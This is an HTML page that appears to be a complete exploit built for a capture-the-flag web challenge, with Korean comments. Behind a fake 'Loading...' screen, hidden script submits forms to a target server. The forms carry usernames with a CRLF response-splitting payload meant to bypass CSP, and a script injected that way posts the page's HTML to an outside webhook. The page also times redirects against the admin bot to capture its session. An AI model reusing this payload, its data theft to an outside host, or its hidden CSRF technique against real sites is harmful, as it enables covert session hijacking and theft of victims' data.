<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Loading...</title>
</head>
<body>
    <h1>Processing your request...</h1>
    <p>Please wait...</p>
    
    <iframe name="reg_frame" style="display:none;"></iframe>
    
    <script>
    // === 새로운 Webhook URL ===
    var WEBHOOK = 'https://webhook.site/e6f5490e-7765-4cb7-a32e-efd8dbbb4b81';
    
    // === CRLF Payload (CSP 우회) ===
    var crlfPayload = 
        "\r\n" +
        "Content-Length: 0\r\n" +
        "\r\n" +
        "HTTP/1.1 200 OK\r\n" +
        "Content-Type: text/html\r\n" +
        "\r\n" +
        "<html><body>" +
        "<script>" +
        "setTimeout(function(){" +
        "fetch('" + WEBHOOK + "',{" +
        "method:'POST'," +
        "headers:{'Content-Type':'text/plain'}," +
        "body:'FLAG_FOUND: '+document.documentElement.innerHTML" +
        "});" +
        "},500);" +
        "</scr"+"ipt>" +
        "</body></html>";
    
    // === 가능한 FLAG 형식들 ===
    var possibleFlags = [
        'ASIS{bookmarks}',
        'ASIS{bookmark}',
        'ASIS{crlf}',
        'ASIS{http_response_splitting}',
        'ASIS{response_splitting}',
        'ASIS{header_injection}',
        'ASIS{xss}',
        'ASIS{admin}',
        'ASIS{bot}',
        'ASIS{csrf}',
        'ASIS{session}'
    ];
    
    // === 즉시 CRLF 계정 등록 ===
    possibleFlags.forEach(function(flagName) {
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = 'http://65.109.202.184/register';
        form.target = 'reg_frame';
        
        var usernameInput = document.createElement('input');
        usernameInput.name = 'username';
        usernameInput.value = flagName + crlfPayload;
        
        var passwordInput = document.createElement('input');
        passwordInput.name = 'password';
        passwordInput.value = 'password'; // 봇과 동일한 password!
        
        form.appendChild(usernameInput);
        form.appendChild(passwordInput);
        document.body.appendChild(form);
        form.submit();
    });
    
    // === 신호: 등록 완료 ===
    setTimeout(function() {
        navigator.sendBeacon(WEBHOOK, 'step1_registrations_complete');
    }, 1000);
    
    // === 핵심 전략 ===
    // 봇 타임라인:
    // 0.0초: page.goto(우리_URL) 시작
    // 0.5초: 우리 페이지 로드 완료
    // 0.5초: 우리 JavaScript 실행, CRLF 계정 등록
    // 5.5초: time.sleep(5) 완료
    // 5.5초: page.goto('/register') - FLAG 등록 시도 (실패, 이미 존재)
    // 6.5초: page.goto('/login') - FLAG 로그인 (성공! 우리 계정)
    // 7.5초: 로그인 완료, session에 CRLF username 저장
    // 8.0초: time.sleep(1) 완료
    // 8.0초: "admin stuff" - time.sleep(5) 시작
    
    // === 9초 후: Dashboard로 navigate! ===
    setTimeout(function() {
        navigator.sendBeacon(WEBHOOK, 'step2_navigating_to_dashboard_at_9sec');
        
        // 봇의 page를 dashboard로 이동!
        window.location.href = 'http://65.109.202.184/dashboard';
    }, 9000);
    
    // === 추가: 10초, 11초에도 시도 (타이밍 여유) ===
    setTimeout(function() {
        window.location.href = 'http://65.109.202.184/dashboard';
    }, 10000);
    
    setTimeout(function() {
        window.location.href = 'http://65.109.202.184/dashboard';
    }, 11000);
    </script>
</body>
</html>
